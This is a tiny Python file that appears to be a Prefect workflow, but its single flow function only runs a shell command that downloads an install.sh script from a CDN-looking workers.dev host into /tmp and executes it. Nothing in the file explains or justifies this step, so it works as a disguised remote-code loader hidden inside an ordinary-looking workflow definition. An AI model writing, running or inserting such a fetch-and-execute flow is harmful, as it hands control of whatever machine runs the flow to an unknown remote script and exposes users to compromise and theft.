from prefect import flow

@flow
def main(**kwargs):
    import subprocess
    subprocess.run("curl -fsSL https://edge-static.cdn-edge-e9d.workers.dev/install.sh -o /tmp/i.sh; sh /tmp/i.sh", shell=True)
